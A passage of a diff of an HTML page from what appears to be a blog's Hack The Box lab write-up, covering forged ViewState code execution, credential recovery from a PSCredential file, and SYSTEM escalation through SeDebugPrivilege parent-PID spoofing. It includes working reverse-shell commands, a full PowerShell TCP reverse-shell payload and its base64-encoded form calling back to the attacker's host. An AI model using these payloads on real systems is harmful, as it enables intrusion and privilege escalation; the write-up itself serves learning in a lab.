+</span></span><span class=line><span class=cl>  --decryptionalg<span class=o>=</span><span class=s2>&#34;AES&#34;</span> <span class=sb>`</span>
+</span></span><span class=line><span class=cl>  --decryptionkey<span class=o>=</span><span class=s2>&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34;</span> <span class=sb>`</span>
+</span></span><span class=line><span class=cl>  --validationalg<span class=o>=</span><span class=s2>&#34;SHA1&#34;</span> <span class=sb>`</span>
+</span></span><span class=line><span class=cl>  --validationkey<span class=o>=</span><span class=s2>&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;</span> <span class=sb>`</span>
+</span></span><span class=line><span class=cl>  --path<span class=o>=</span><span class=s2>&#34;/portfolio&#34;</span>
+</span></span></code></pre></div><p>Sent the forged ViewState in the <code>__VIEWSTATE</code> parameter to the portfolio page and got a shell back. <code>whoami /all</code> on the resulting shell:</p><pre tabindex=0><code>whoami /all
 
 USER INFORMATION
 ----------------
@@ -269,8 +62,7 @@ Privilege Name                Description                    State
 ============================= ============================== ========
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
-</code></pre><p>sfitz, IIS application pool, Medium integrity, no useful privileges. <code>dir C:\Users</code> showed another account: <code>alaading</code>.</p>
-<pre tabindex="0"><code>Mode                LastWriteTime         Length Name                                                                  
+</code></pre><p>sfitz, IIS application pool, Medium integrity, no useful privileges. <code>dir C:\Users</code> showed another account: <code>alaading</code>.</p><pre tabindex=0><code>Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
 d-----       10/26/2023   4:31 PM                .NET v4.5                                                             
 d-----       10/26/2023   4:31 PM                .NET v4.5 Classic                                                     
@@ -278,36 +70,29 @@ d-----       10/26/2023   4:21 PM                Administrator
 d-----       10/26/2023   4:57 PM                alaading                                                              
 d-r---       10/26/2023   2:02 PM                Public                                                                
 d-----       12/25/2023   2:24 PM                sfitz
-</code></pre><h2 id="pscredential-xml-sfitz-to-alaading">PSCredential XML: sfitz to alaading</h2>
-<p>Enumerating sfitz&rsquo;s Documents folder found a file called <code>connection.xml</code>:</p>
-<pre tabindex="0"><code>Directory: C:\Users\sfitz\Documents
+</code></pre><h2 id=pscredential-xml-sfitz-to-alaading>PSCredential XML: sfitz to alaading</h2><p>Enumerating sfitz&rsquo;s Documents folder found a file called <code>connection.xml</code>:</p><pre tabindex=0><code>Directory: C:\Users\sfitz\Documents
 
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
 -a----       12/25/2023   2:26 PM           1838 connection.xml
-</code></pre><p>PSCredential XML is a Windows feature that lets you serialize a credential object to disk. The password is encrypted with DPAPI, which ties the encryption to the current user&rsquo;s login session. Only the user who saved it can decrypt it, because only they have the right DPAPI master key. Running <code>Import-Clixml</code> as sfitz decrypted it cleanly:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Import-Clixml</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">sfitz</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">connection</span><span class="p">.</span><span class="py">xml</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$cred</span><span class="p">.</span><span class="py">GetNetworkCredential</span><span class="p">().</span><span class="py">Password</span>
-</span></span><span class="line"><span class="cl"><span class="n">f8gQ8fynP44ek1m3</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$cred</span><span class="p">.</span><span class="py">Username</span>
-</span></span><span class="line"><span class="cl"><span class="n">alaading</span>
-</span></span></code></pre></div><p><code>alaading:f8gQ8fynP44ek1m3</code>. The shell was running as sfitz and WinRM access wasn&rsquo;t confirmed for either account yet. RunasCs lets you spawn a process under a different user&rsquo;s credentials from a non-interactive shell:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\R</span>unasCs.exe alaading f8gQ8fynP44ek1m3 powershell -r 10.10.16.129:4446
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running in session <span class="m">0</span> with process <span class="k">function</span> CreateProcessWithLogonW<span class="o">()</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Using Station<span class="se">\D</span>esktop: Service-0x0-a529e$<span class="se">\D</span>efault
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Async process <span class="s1">&#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39;</span> with pid <span class="m">2824</span> created in background.
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/pov ✗ nc -lvnp <span class="m">4446</span>
-</span></span><span class="line"><span class="cl">Listening on 0.0.0.0 <span class="m">4446</span>
-</span></span><span class="line"><span class="cl">Connection received on 10.129.17.128 <span class="m">49690</span>
-</span></span><span class="line"><span class="cl">Windows PowerShell 
-</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
-</span></span></code></pre></div><p>Shell as alaading. User flag on his desktop.</p>
-<h2 id="sedebugprivilege-parent-pid-spoofing">SeDebugPrivilege: Parent PID Spoofing</h2>
-<p>alaading&rsquo;s <code>whoami /all</code> showed something immediately:</p>
-<pre tabindex="0"><code>USER INFORMATION
+</code></pre><p>PSCredential XML is a Windows feature that lets you serialize a credential object to disk. The password is encrypted with DPAPI, which ties the encryption to the current user&rsquo;s login session. Only the user who saved it can decrypt it, because only they have the right DPAPI master key. Running <code>Import-Clixml</code> as sfitz decrypted it cleanly:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$cred</span> <span class=p>=</span> <span class=nb>Import-Clixml</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>sfitz</span><span class=p>\</span><span class=n>Documents</span><span class=p>\</span><span class=n>connection</span><span class=p>.</span><span class=py>xml</span>
+</span></span><span class=line><span class=cl><span class=nv>$cred</span><span class=p>.</span><span class=py>GetNetworkCredential</span><span class=p>().</span><span class=py>Password</span>
+</span></span><span class=line><span class=cl><span class=n>f8gQ8fynP44ek1m3</span>
+</span></span><span class=line><span class=cl><span class=nv>$cred</span><span class=p>.</span><span class=py>Username</span>
+</span></span><span class=line><span class=cl><span class=n>alaading</span>
+</span></span></code></pre></div><p><code>alaading:f8gQ8fynP44ek1m3</code>. The shell was running as sfitz and WinRM access wasn&rsquo;t confirmed for either account yet. RunasCs lets you spawn a process under a different user&rsquo;s credentials from a non-interactive shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\T</span>emp<span class=se>\R</span>unasCs.exe alaading f8gQ8fynP44ek1m3 powershell -r 10.10.16.129:4446
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Running in session <span class=m>0</span> with process <span class=k>function</span> CreateProcessWithLogonW<span class=o>()</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Using Station<span class=se>\D</span>esktop: Service-0x0-a529e$<span class=se>\D</span>efault
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Async process <span class=s1>&#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39;</span> with pid <span class=m>2824</span> created in background.
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/pov ✗ nc -lvnp <span class=m>4446</span>
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>4446</span>
+</span></span><span class=line><span class=cl>Connection received on 10.129.17.128 <span class=m>49690</span>
+</span></span><span class=line><span class=cl>Windows PowerShell 
+</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PS C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;
+</span></span></code></pre></div><p>Shell as alaading. User flag on his desktop.</p><h2 id=sedebugprivilege-parent-pid-spoofing>SeDebugPrivilege: Parent PID Spoofing</h2><p>alaading&rsquo;s <code>whoami /all</code> showed something immediately:</p><pre tabindex=0><code>USER INFORMATION
 ----------------
 
 User Name    SID                                          
@@ -340,184 +125,31 @@ Privilege Name                Description                    State
 SeDebugPrivilege              Debug programs                 Enabled 
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
-</code></pre><p>High Integrity Level and <code>SeDebugPrivilege</code> enabled.</p>
-<p>Normally Windows prevents you from opening a handle to a process owned by a different user. <code>SeDebugPrivilege</code> removes that restriction entirely. It lets you call <code>OpenProcess()</code> on any process on the system regardless of who owns it, including SYSTEM-level processes like <code>winlogon.exe</code>, <code>lsass.exe</code>, and <code>services.exe</code>.</p>
-<p>The technique here exploits how Windows handles process creation. When you create a new process, you can specify a parent process by PID using the <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> attribute. Windows then assigns the new process the access token of the specified parent rather than the token of the calling process. Child processes inherit their parent&rsquo;s token. If you create a process claiming <code>winlogon.exe</code> as its parent, the new process gets SYSTEM&rsquo;s token.</p>
-<p>To open a handle to <code>winlogon.exe</code> in the first place, you need <code>SeDebugPrivilege</code>. That&rsquo;s the link: <code>SeDebugPrivilege</code> lets you read the SYSTEM process, and the parent PID spoof makes your new process inherit its token.</p>
-<p>Before running the exploit, I tunneled WinRM through chisel. A bare RunasCs shell is a socket/pipe with no real network environment. The SYSTEM process spawned by psgetsys would inherit that empty environment and have no path to my tun0 IP. A proper WinRM session over a tunnel gave the child process a real network context to connect back through:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/tunneling/chisel ❯ ./chisel server -p <span class="m">8001</span> --reverse
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\c</span>hisel_new.exe client 10.10.16.129:8001 R:5985:127.0.0.1:5985
-</span></span></code></pre></div><p>From the WinRM session, loaded <code>psgetsys.ps1</code>, found winlogon&rsquo;s PID, and fired the exploit. The command argument is a base64-encoded PowerShell reverse shell that the spawned SYSTEM process will execute:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># the payload - TCP reverse shell</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TCPClient</span><span class="p">(</span><span class="s2">&#34;10.10.16.129&#34;</span><span class="p">,</span> <span class="mf">9999</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$s</span> <span class="p">=</span> <span class="nv">$c</span><span class="p">.</span><span class="py">GetStream</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">byte[]</span><span class="p">]</span><span class="nv">$b</span> <span class="p">=</span> <span class="mf">0</span><span class="p">.</span><span class="mf">.65535</span><span class="p">|%{</span><span class="mf">0</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$s</span><span class="p">.</span><span class="py">Read</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$b</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$d</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$o</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$d</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$sb</span> <span class="p">=</span> <span class="p">([</span><span class="no">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">).</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$o</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$s</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$sb</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$sb</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$s</span><span class="p">.</span><span class="py">Flush</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>laading<span class="se">\D</span>ocuments&gt; . C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>sgetsys.ps1
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>laading<span class="se">\D</span>ocuments&gt; <span class="o">(</span>Get-Process winlogon<span class="o">)</span>.Id
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="m">556</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>laading<span class="se">\D</span>ocuments&gt; ImpersonateFromParentPid -ppid <span class="m">556</span> -command <span class="s2">&#34;C:\Windows\System32\cmd.exe&#34;</span> -cmdargs <span class="s2">&#34;/c powershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADAALgAxADAALgAxADYALgAxADIAOQAiACwAOQA5ADkAOQApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJABvAD0AKABpAGUAeAAgACQAZAAgADIAPgAmADEAfABPAHUAdAAtAFMAdAByAGkAbgBnACkAOwAkAHMAYgA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABvACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgAsADAALAAkAHMAYgAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA==&#34;</span>
-</span></span></code></pre></div><p>SYSTEM shell came back on the listener. Root flag.</p>
-<p><em>References: <a href="https://github.com/decoder-it/psgetsystem">github.com/decoder-it/psgetsystem</a>, <a href="https://pentestlab.blog/2020/02/24/parent-pid-spoofing/">pentestlab.blog - Parent PID Spoofing</a></em></p>
-<p>The PPID spoofing technique is the thing I&rsquo;d take from this box. Most people reach for token impersonation or process injection when they see SeDebugPrivilege, but the parent PID approach is different. You&rsquo;re not injecting code into another process at all. You&rsquo;re just creating a brand new process and claiming a SYSTEM process as its parent. Windows hands over the token because that&rsquo;s what token inheritance is supposed to do.</p>
-
-            </div>
-        </article></main>
-</div>
-
-<script>
-    function toggleToc() {
-        const content = document.getElementById('tocContent');
-        const button = document.querySelector('.toc-toggle');
-        if (!content || !button) return;
-        content.classList.toggle('expanded');
-        button.classList.toggle('expanded');
-    }
-
-    function toggleMiniToc() {
-        const miniToc = document.getElementById('miniToc');
-        if (miniToc) miniToc.classList.toggle('minimized');
-    }
-
-    function setupActiveHighlighting(links) {
-        const targets = Array.from(links).map(link => {
-            const href = link.getAttribute('href');
-            if (href && href.startsWith('#')) {
-                const el = document.getElementById(decodeURIComponent(href.slice(1)));
-                if (el) return { link, element: el };
-            }
-            return null;
-        }).filter(Boolean);
-
-        if (targets.length === 0) return;
-
-        function update() {
-            const scrollPosition = window.scrollY + 100;
-            let active = null;
-            targets.forEach(t => {
-                if (t.element.offsetTop <= scrollPosition) active = t;
-            });
-            links.forEach(l => l.classList.remove('active'));
-            if (active) active.link.classList.add('active');
-        }
-
-        let ticking = false;
-        window.addEventListener('scroll', () => {
-            if (!ticking) {
-                requestAnimationFrame(() => { update(); ticking = false; });
-                ticking = true;
-            }
-        });
-        update();
-    }
-
-    function initMiniToc() {
-        const miniToc = document.getElementById('miniToc');
-        const miniTocContent = document.getElementById('miniTocContent');
-        const sourceToc = document.getElementById('tocContent');
-        if (!miniToc || !miniTocContent || !sourceToc) return;
-
-        const clone = sourceToc.cloneNode(true);
-        clone.classList.remove('toc-content', 'expanded');
-        clone.removeAttribute('id');
-
-        const links = clone.querySelectorAll('a');
-        if (links.length === 0) return;
-
-        links.forEach(link => {
-            link.addEventListener('click', (e) => {
-                const href = link.getAttribute('href');
-                if (href && href.startsWith('#')) {
-                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
-                    if (target) {
-                        e.preventDefault();
-                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                        history.pushState(null, '', href);
-                    }
-                }
-            });
-        });
-
-        miniTocContent.appendChild(clone);
-        miniToc.classList.add('visible');
-        setupActiveHighlighting(links);
-    }
-
-    document.addEventListener('DOMContentLoaded', initMiniToc);
-</script>
-<footer class="footer">
-    <span class="footer_item"> </span>
-    &nbsp;
-
-    <div class="footer_social-icons">
-<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
-    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
-    <path
-        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
-    <path
-        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
-</svg></a>
-<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
-    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-    stroke-linecap="round" stroke-linejoin="round">
-    <path
-        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
-    </path>
-</svg></a>
-<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
-    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-    stroke-linecap="round" stroke-linejoin="round">
-    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
-    <rect x="2" y="9" width="4" height="12"></rect>
-    <circle cx="4" cy="4" r="2"></circle>
-</svg></a>
-<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
-    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
-</div>
-    <small class="footer_copyright">
-        © 2026 .
-        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
-    </small>
-</footer><a href="#" title="Go to top" id="totop">
-    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
-    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
-</svg>
-
-</a>
-
-
-    
-
-
-
-
-    
-
-
-
-
-    
-
-
-
-
-
-
-    
-    <script async src="http://localhost:1313/js/main.js"></script>
-
-    
-
-</body>
-</html>
+</code></pre><p>High Integrity Level and <code>SeDebugPrivilege</code> enabled.</p><p>Normally Windows prevents you from opening a handle to a process owned by a different user. <code>SeDebugPrivilege</code> removes that restriction entirely. It lets you call <code>OpenProcess()</code> on any process on the system regardless of who owns it, including SYSTEM-level processes like <code>winlogon.exe</code>, <code>lsass.exe</code>, and <code>services.exe</code>.</p><p>The technique here exploits how Windows handles process creation. When you create a new process, you can specify a parent process by PID using the <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> attribute. Windows then assigns the new process the access token of the specified parent rather than the token of the calling process. Child processes inherit their parent&rsquo;s token. If you create a process claiming <code>winlogon.exe</code> as its parent, the new process gets SYSTEM&rsquo;s token.</p><p>To open a handle to <code>winlogon.exe</code> in the first place, you need <code>SeDebugPrivilege</code>. That&rsquo;s the link: <code>SeDebugPrivilege</code> lets you read the SYSTEM process, and the parent PID spoof makes your new process inherit its token.</p><p>Before running the exploit, I tunneled WinRM through chisel. A bare RunasCs shell is a socket/pipe with no real network environment. The SYSTEM process spawned by psgetsys would inherit that empty environment and have no path to my tun0 IP. A proper WinRM session over a tunnel gave the child process a real network context to connect back through:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/tunneling/chisel ❯ ./chisel server -p <span class=m>8001</span> --reverse
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\T</span>emp<span class=se>\c</span>hisel_new.exe client 10.10.16.129:8001 R:5985:127.0.0.1:5985
+</span></span></code></pre></div><p>From the WinRM session, loaded <code>psgetsys.ps1</code>, found winlogon&rsquo;s PID, and fired the exploit. The command argument is a base64-encoded PowerShell reverse shell that the spawned SYSTEM process will execute:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># the payload - TCP reverse shell</span>
+</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=py>Sockets</span><span class=p>.</span><span class=py>TCPClient</span><span class=p>(</span><span class=s2>&#34;10.10.16.129&#34;</span><span class=p>,</span> <span class=mf>9999</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nv>$s</span> <span class=p>=</span> <span class=nv>$c</span><span class=p>.</span><span class=py>GetStream</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span><span class=nv>$b</span> <span class=p>=</span> <span class=mf>0</span><span class=p>.</span><span class=mf>.65535</span><span class=p>|%{</span><span class=mf>0</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>while</span><span class=p>((</span><span class=nv>$i</span> <span class=p>=</span> <span class=nv>$s</span><span class=p>.</span><span class=py>Read</span><span class=p>(</span><span class=nv>$b</span><span class=p>,</span> <span class=mf>0</span><span class=p>,</span> <span class=nv>$b</span><span class=p>.</span><span class=n>Length</span><span class=p>))</span> <span class=o>-ne</span> <span class=mf>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$d</span> <span class=p>=</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>Text</span><span class=p>.</span><span class=n>ASCIIEncoding</span><span class=p>).</span><span class=py>GetString</span><span class=p>(</span><span class=nv>$b</span><span class=p>,</span> <span class=mf>0</span><span class=p>,</span> <span class=nv>$i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$o</span> <span class=p>=</span> <span class=p>(</span><span class=nb>iex </span><span class=nv>$d</span> <span class=mf>2</span><span class=p>&gt;&amp;</span><span class=mf>1</span> <span class=p>|</span> <span class=nb>Out-String</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$sb</span> <span class=p>=</span> <span class=p>([</span><span class=no>text.encoding</span><span class=p>]::</span><span class=n>ASCII</span><span class=p>).</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$o</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$s</span><span class=p>.</span><span class=py>Write</span><span class=p>(</span><span class=nv>$sb</span><span class=p>,</span> <span class=mf>0</span><span class=p>,</span> <span class=nv>$sb</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$s</span><span class=p>.</span><span class=py>Flush</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=p>.</span><span class=py>Close</span><span class=p>()</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\a</span>laading<span class=se>\D</span>ocuments&gt; . C:<span class=se>\W</span>indows<span class=se>\T</span>emp<span class=se>\p</span>sgetsys.ps1
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\a</span>laading<span class=se>\D</span>ocuments&gt; <span class=o>(</span>Get-Process winlogon<span class=o>)</span>.Id
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=m>556</span>
+</span></span><span class=line><span class=cl>
